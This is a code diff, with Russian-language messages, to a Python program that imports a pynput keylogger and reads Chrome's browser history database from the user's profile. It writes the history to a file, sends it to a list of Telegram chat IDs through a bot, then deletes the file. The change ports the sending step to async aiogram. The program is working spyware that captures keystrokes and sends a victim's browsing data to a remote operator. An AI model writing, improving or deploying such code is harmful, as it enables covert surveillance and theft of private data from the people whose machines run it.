@@ -1,10 +1,13 @@
-from config import LOG_FILE, USER, KEYLOG_FILE, bot, LOG_DIR, KNOWN_IDS
+from config import LOG_FILE, USER, KEYLOG_FILE, LOG_DIR, KNOWN_IDS, TOKEN
 from pynput import keyboard
 from time import strftime
 import sqlite3
 import os
 from datetime import datetime, timedelta
 import logging
+import asyncio
+from aiogram import Bot
+from aiogram.types import FSInputFile
 
 
 def on_press(key):
@@ -45,7 +48,7 @@ def setup_logging():
     logging.info("🔧 Логирование запущено")
 
 
-def get_browser_history_log_to_file(browser, limit=100):
+async def get_browser_history_log_to_file(browser, limit=100):
     try:
         if browser == 'chrome':
             history_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\History'
@@ -84,10 +87,13 @@ def get_browser_history_log_to_file(browser, limit=100):
                 visit_time = datetime(1601, 1, 1) + timedelta(microseconds=timestamp)
                 f.write(f"📅 {visit_time.strftime('%Y-%m-%d %H:%M:%S')}\n🔗 {title or '(без названия)'}\n🌐 {url}\n\n")
 
+        bot = Bot(token=TOKEN)
         for chat_id in KNOWN_IDS:
-            bot.sendDocument(chat_id, open(output_path, 'rb'))
+            await bot.send_document(chat_id, FSInputFile(output_path))
         os.remove(output_path)
+        await bot.session.close()
 
     except Exception as e:
         return f"⚠️ Ошибка: {e}"
+
 
